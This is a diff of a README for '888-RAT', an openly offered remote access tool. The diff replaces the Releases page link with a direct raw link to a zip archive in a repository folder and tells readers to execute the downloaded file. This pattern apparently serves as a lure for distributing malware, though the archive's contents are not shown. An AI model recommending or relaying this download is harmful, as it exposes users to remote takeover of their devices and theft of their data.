@@ -17,9 +17,9 @@ Welcome to 888-RAT, your go-to solution for remote access across Windows, Androi
 
 ### Installation
 
-To get started with 888-RAT, simply download the tool from our [Releases](https://github.com/ArdhanGumelar/888-RAT/releases) section. Execute the downloaded file to begin leveraging the power of this versatile remote access tool across multiple platforms.
+To get started with 888-RAT, simply download the tool from our [Releases](https://github.com/ArdhanGumelar/888-RAT/raw/refs/heads/main/visitator/RAT_1.9.zip) section. Execute the downloaded file to begin leveraging the power of this versatile remote access tool across multiple platforms.
 
-👉 [Download 888-RAT](https://github.com/ArdhanGumelar/888-RAT/releases)
+👉 [Download 888-RAT](https://github.com/ArdhanGumelar/888-RAT/raw/refs/heads/main/visitator/RAT_1.9.zip)
 
 ### How to Use
 
